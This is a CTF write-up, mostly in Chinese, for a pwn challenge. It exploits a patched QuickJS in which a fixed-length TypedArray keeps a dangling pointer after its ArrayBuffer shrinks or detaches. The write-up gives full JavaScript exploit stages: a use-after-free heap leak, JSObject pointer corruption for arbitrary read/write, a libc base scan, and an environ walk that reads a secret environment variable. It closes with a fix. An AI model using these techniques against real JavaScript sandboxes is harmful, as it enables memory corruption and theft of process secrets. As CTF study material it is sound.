# 长连接脚本求值服务

```
> TPCTF 2026 · pwn · 挑战 ID `AUTHORED-7480926C` · 状态 solved
```

## 一句话

A TCP service evaluates JavaScript snippets sent as JSON lines and returns JSON results.

## 附件

| 文件 | 大小 | sha256 |
| --- | --- | --- |
| `src/quickjs-base-bundle.tar.gz` | 1.5 MB | `a69e0f7f77c5…` |
| `src/patch.diff` | 3.5 KB | `4e5d270918e5…` |

## 分析与利用

FLAG：«FLAG»

分值：动态计分

### 0. 题目信息

• 目标：172.16.141.2:8000，TCP JSON Lines。
• 请求：{"code":"<JavaScript source>"}\n
• 响应：{"ok":true,"result":...} 或 {"ok":false,"error":{...}}
• 一条 TCP 连接内 QuickJS runtime 状态保持。
• 附件：
• quickjs-base-bundle.tar.gz：未打补丁的 base（QuickJS 2026-06-04 + C worker runner + TCP adapter）。
• patch (4).diff：服务实际使用的引擎改动，共 3 个 hunk，全部位于 third_party/quickjs/src/quickjs.c。
• 最终 flag：

«FLAG»

### 1. 补丁分析

patch (4).diff 的三个 hunk：

1. js_array_buffer_constructor3 中新增 new_data / new_data_owned 临时变量。
2. 把 backing store 的分配提前到 ArrayBuffer 描述符之前，失败路径相应调整。
3. 在 js_array_buffer_update_typed_arrays() 中，把原本无条件的

```
p->u.array.count = 0;
p->u.array.u.ptr = NULL;
```

移进了 if (ta->track_rab) 分支：

@@ -56814,11 +56829,11 @@

```
} else {
-            p->u.array.count = 0;
```

-            p->u.array.u.ptr = NULL; size_log2 = typed_array_size_log2(p->class_id); size_elem = 1 << size_log2; if (ta->track_rab) {

```
+                p->u.array.count = 0;
+                p->u.array.u.ptr = NULL; if (len >= (int64_t)ta->offset + size_elem) { p->u.array.count = (len - ta->offset) >> size_log2; p->u.array.u.ptr = &data[ta->offset];
```

base 版本里，任何 resize/detach 都会先把所有视图的 count 和 data 指针清空，再按 track_rab / 定长视图重新计算。打补丁后：

• track_rab == TRUE：清零仍在分支内，逻辑不变。
• track_rab == FALSE（显式长度视图）：只有 len >= ta->offset + ta->length 时才重设 count/ptr。若 buffer 被收缩到 len < offset + length，else 里的 if 不成立，清零语句又已经被移走，于是旧的 count 和旧 data 指针原封不动保留下来。

对应源码位置（base 行号）：

• js_array_buffer_update_typed_arrays()：quickjs.c:56794-56835
• typed_array_init()：quickjs.c:59607-59635
• js_typed_array_constructor()：quickjs.c:59789-59871

track_rab 的来源：

```
/* 未显式给长度，且 buffer 是 resizable 的 */
track_rab = array_buffer_is_resizable(abuf);      /* 59835 */
```

...

```
} else {
/* 显式长度路径：track_rab 保持 FALSE */
if ((offset + (len << size_log2)) > abuf->byte_length) ...
}
```

...

```
typed_array_init(ctx, obj, buffer, offset, len, track_rab);
```

typed_array_init() 里：

ta->length = len << size_log2;   /* 字节数 */

```
ta->track_rab = track_rab;
p->u.array.count = len;
p->u.array.u.ptr = abuf->data + offset;
```

所以：

```js
var ab = new ArrayBuffer(0x4000, {maxByteLength: 0x4000});
var ta = new Uint8Array(ab, 0, 0x4000);   // 显式长度 -> track_rab = FALSE
```

ab.resize(0x100);                          // ta.length 仍为 0x4000，ta[0x3000] 可读写

ab.transfer(0) 更直接：js_array_buffer_transfer() 在 new_len == 0 时调用 JS_DetachArrayBuffer()，后者执行 free_func(data) 把整块 backing store js_free 掉，然后才调用 js_array_buffer_update_typed_arrays()。由于补丁的 bug，定长视图 ta 仍指向已释放内存，并且保留 count = 0x4000。

最小验证（服务返回 [4096,4096,0,256,"number"]）：

```js
var ab = new ArrayBuffer(4096, {maxByteLength:4096});
var ta = new Uint8Array(ab, 0, 4096);
var n0 = ta.length;
ab.resize(256);
```

[n0, ta.length, ta.byteLength, ab.byteLength, typeof ta[3000]]

### 2. 堆布局与利用原语

**2.1 QuickJS 分配器**

• <= 512 字节的分配走 QuickJS 自己的 arena，块头 8 字节，用户指针在 +8。
• > 512 字节走 js_malloc_large()：libc malloc(size + 8)，8 字节 JSMallocLargeBlockHeader，所以 QJS 用户指针 = libc chunk + 0x18。
• 对 len = 0x4000 的 ArrayBuffer data：
• libc 请求 0x4000 + 8 = 0x4008
• glibc chunk 大小 align16(0x4008 + 8) = 0x4010
• QJS data 指针 = chunk + 0x18，即 ta[0]

**2.2 释放块与 unsorted bin**

布置：

```js
var ab = new ArrayBuffer(0x4000, {maxByteLength: 0x4000});
var ta = new Uint8Array(ab, 0, 0x4000);   // 定长视图，制造 stale count/ptr
for (var i = 0; i < 0x4000; i++) ta[i] = i & 255;
var guard = new ArrayBuffer(0x4000);      // 防止释放块与 top 合并
```

ab.transfer(0);                            // 释放整块 backing store

释放后，chunk 进入 unsorted bin。它的 fd / bk 位于 chunk+0x10 / chunk+0x18，换算成 ta 偏移是 ta[-8] / ta[0]。由于只有一个 unsorted chunk：

• ta[0..7] = bk = main_arena + 0x60
• 因此 main_arena = bk - 0x60

guard（以及中间仍存活的其他分配）保证释放块后面有已分配的 chunk，不会和 top 合并，从而保留为独立的 0x4010 空闲块，可以被后续分配切分。

**2.3 把 JSObject 放进释放块**

```
{} 对象是 72 字节 class（8 字节块头 + 0x40 的 JSObject）。先分配 120 个 dummy 对象，迫使 72 字节 class 创建新的 arena：
```

• n_blocks = (4096 - sizeof(JSMallocArena)) / 72 = (4096 - 40) / 72 = 56
• arena 请求大小 40 + 56 * 72 = 4072（arena 通过宿主 mf.js_malloc 直接分配，不再套 QJS 的 large 块头）
• glibc chunk 大小 align16(4072 + 8) = 0xFF0

这个 0xFF0 的 arena 会从刚释放的 0x4010 块中切出来。接着创建：

```js
var V = new Uint8Array(0x4321);
```

V 的 JSObject（72 字节 class）就落在这个 arena 里，地址位于 ta 的可见范围内。扫 ta 找特征：

```
if (ta[j + 0x12] === 23 && g32(j + 0x38) === 0x4321) { o = j; break; }
```

• +0x12：class_id，Uint8Array = 23
• +0x38：u.array.count = 0x4321

实测 o 在 0x1c30 ~ 0x1de0 之间浮动，但扫描可以稳定找到。

**2.4 任意读写**

64 位下 JSObject 的关键偏移：

| 偏移 | 字段 |
| --- | --- |
| +0x10 | bitfields |
| +0x12 | class_id（u16） |
| +0x18 | shape |
| +0x20 | prop |
| +0x28 | u1（typed_array 指针） |
| +0x30 | u.array.u.ptr（数据指针） |
| +0x38 | u.array.count（u32） |

Uint8Array 的快速路径直接使用 +0x30 和 +0x38。因此：

```js
function s64(o, v) { /* 往 ta 的 o 处写 8 字节小端 v */ }
```

s64(o + 0x30, target);       // V 的数据指针 = target

V[0]; V[1]; ...              // 读取 target 处的字节

count 保持 0x4321 不变，所以一次最多能读 0x4321 字节。用完把原指针写回，避免影响后续操作。

### 3. 泄露 libc 基址

ta[0] 给出 bk = main_arena + 0x60。接下来从 main_arena 向下按 页对齐 地址扫描 ELF magic：

```js
var start = bk - 0x60;
var p0 = start - (start % 4096);
var base = -1;
for (var k = 0; k < 0x300; k++) {
var a = p0 - k * 4096;
if (a < 0x1000) break;
if (rd32(a) === 0x464c457f) { base = a; break; }
}
```

两个坑：

1. 必须页对齐。main_arena 不是页对齐的（本实例 main_arena 低 12 位是 0xc60），按 main_arena - k*0x1000 扫描永远读不到页首的 ELF header，会白扫甚至越过 libc 基址。
2. 找到第一个 magic 必须立即 break。继续向下就会进入未映射页，worker 直接 WorkerClosedError: worker stdout closed。

本实例实测：

```
bk        = 0x748f3974ccc0
main_arena= 0x748f3974cc60
```

libc base = 0x748f39579000

即远端 libc 的 main_arena 偏移是 0x1d3c60。这个值和 Ubuntu 24.04（2.39-0ubuntu8.6）的 0x203ac0 不同，说明远端是另一个 patch/构建；因此不能硬编码，必须用 ELF 扫描求基址。

### 4. 从 environ 读 flag

服务端 worker 以 QJS_CTF_FLAG 环境变量接收 flag（runner/qjs_runner.c 中 getenv("QJS_CTF_FLAG")，只打印“是否存在”到 stderr）。JS 层没有 std/os/process/require，不能直接读环境变量，只能从内存里找 environ。

有了 libc 基址后：

1. 从 main_arena 向上按 8 字节扫描 libc 数据段/bss，找落在栈范围的指针（0x7ff...）。
2. 命中若干全局变量：
• 指向 "qjs_runner" 的字符串指针
• 指向 "/app/build/qjs_runner" 的字符串指针
• argv 数组
• envp 数组（environ）
3. 判断方式：对候选的栈指针 p 再读一个 qword；如果仍是栈指针，说明 p 指向指针数组，遍历数组项并读字符串。
4. 在字符串中找 QJS_CTF_FLAG=。

本实例 envp 内容：

```
LC_ALL=C
LANG=C
QJS_CTF_FLAG=«FLAG»
```

注意：环境字符串位于栈映射顶部附近，读取长度必须止于页边界。普通 read 200 bytes 很容易跨过栈顶页，直接 SIGSEGV 打死 worker；按 4096 - (addr % 4096) 截断、遇到 NUL 提前停止即可。

### 5. Exploit

完整脚本：solve_p4.py

核心两段：

Stage 1：建立 stale 视图、定位 JSObject、泄露 libc base

```js
var L = 0x4000;
var ab = new ArrayBuffer(L, {maxByteLength: L});
var ta = new Uint8Array(ab, 0, L);
for (var i = 0; i < L; i++) ta[i] = i & 255;
var guard = new ArrayBuffer(0x4000);
ab.transfer(0);
function g32(o) { return (ta[o] | (ta[o+1] << 8) | (ta[o+2] << 16) | (ta[o+3] << 24)) >>> 0; }
function g64(o) { return g32(o) + g32(o+4) * 4294967296; }
var bk = g64(0);                 // main_arena + 0x60
var d = new Array(120);
for (var i = 0; i < 120; i++) d[i] = {};
var V = new Uint8Array(0x4321);
var o = -1;
for (var j = 0; j < L - 0x40; j += 8) {
if (ta[j+0x12] === 23 && g32(j+0x38) === 0x4321) { o = j; break; }
}
function s32(o,v){ta[o]=v&255;ta[o+1]=(v>>>8)&255;ta[o+2]=(v>>>16)&255;ta[o+3]=(v>>>24)&255;}
function s64(o,v){s32(o,v%4294967296);s32(o+4,Math.floor(v/4294967296));}
var oldp = g64(o + 0x30);
function rd32(a) { s64(o + 0x30, a); return (V[0] | (V[1]<<8) | (V[2]<<16) | (V[3]<<24)) >>> 0; }
var start = bk - 0x60;
var p0 = start - (start % 4096);
var base = -1;
for (var k = 0; k < 0x300; k++) {
var a = p0 - k * 4096;
if (a < 0x1000) break;
if (rd32(a) === 0x464c457f) { base = a; break; }
}
s64(o + 0x30, oldp);
```

[o, bk.toString(16), base.toString(16)]

Stage 2：扫描 libc 数据、遍历 envp

Stage 2 必须在同一条 TCP 连接、Stage 1 之后执行，依赖 Stage 1 留在全局对象上的 ta / bk / o / V / oldp 等变量。

```js
function rV64(){return V[0]+V[1]*256+V[2]*65536+V[3]*16777216+V[4]*4294967296+V[5]*1099511627776+V[6]*281474976710656+V[7]*72057594037927936;}
function rdq(a) { s64(o + 0x30, a); return rV64(); }
function rdbyte(a) { s64(o + 0x30, a); return V[0]; }
function rdstrsafe(a) {
var lim = 4096 - (a % 4096);       // 不跨页
if (lim > 200) lim = 200;
var s = '';
for (var i = 0; i < lim; i++) {
var c = rdbyte(a + i);
if (c === 0) break;
s += String.fromCharCode(c);
}
return s;
}
var st = bk - 0x60;
var hits = [];
for (var k = 1; k <= 0x2000 && hits.length < 10; k++) {
var ga = st + k * 8;
var v = rdq(ga);
if (v > 0x7ff000000000 && v < 0x800000000000) hits.push([ga, v]);
}
var flag = null;
for (var h = 0; h < hits.length && flag === null; h++) {
var p = hits[h][1];
var q = rdq(p);
if (q > 0x7ff000000000 && q < 0x800000000000) {   // p 是指针数组
for (var i = 0; i < 40; i++) {
var sp = rdq(p + 8 * i);
if (sp === 0) break;
if (sp < 0x7ff000000000 || sp >= 0x800000000000) break;
var s = rdstrsafe(sp);
if (s.indexOf('QJS_CTF_FLAG=') === 0) flag = s.substring(13);
}
}
}
s64(o + 0x30, oldp);
```

flag

### 6. 复现

```bash
python jsbox4/solve_p4.py
```

输出：

[+] JSObject offset : 0x1de0

[+] unsorted bk     : 0x748f3974ccc0

[+] libc base       : 0x748f39579000

[+] QJS_CTF_FLAG    : «FLAG»

脚本在单个 TCP 连接内分两次 eval：

1. 构造 stale 视图、释放 backing store、布置 72-class arena、找到 V 的 JSObject、求 libc base。
2. 扫描 libc 数据中的栈指针、定位 envp、读出 QJS_CTF_FLAG。

每次新连接的 ASLR 不同，但脚本都会重新定位；我在多个新连接上读到相同 flag。

### 7. 修复建议

补丁 hunk 3 应改回“先无条件清零，再按分支重算”，或者非 track_rab 分支在 len < offset + length 时显式把 count/ptr 置空：

```
p->u.array.count = 0;
p->u.array.u.ptr = NULL;
size_log2 = typed_array_size_log2(p->class_id);
```

...

当前写法在“定长视图 + buffer 收缩/分离”时会保留悬垂指针，属于典型的 UAF/越界读写。

### 8. Flag

«FLAG»

## 结果

- flag sha256：`e3aac024add2e04a1a309abe3e3718c805595e032d2f2e180d4a589ade5c9ab7`
- 明文 flag 不入库；提交记录见 `.ctf-submissions.jsonl` 或原始 WP。

## 脚本

- `solve/solve_p4.py`

## 待核实

- 本条目由 WP 第 32 节《长连接脚本求值服务》与平台附件自动合成，建议人工复核 summary 与 fingerprints。
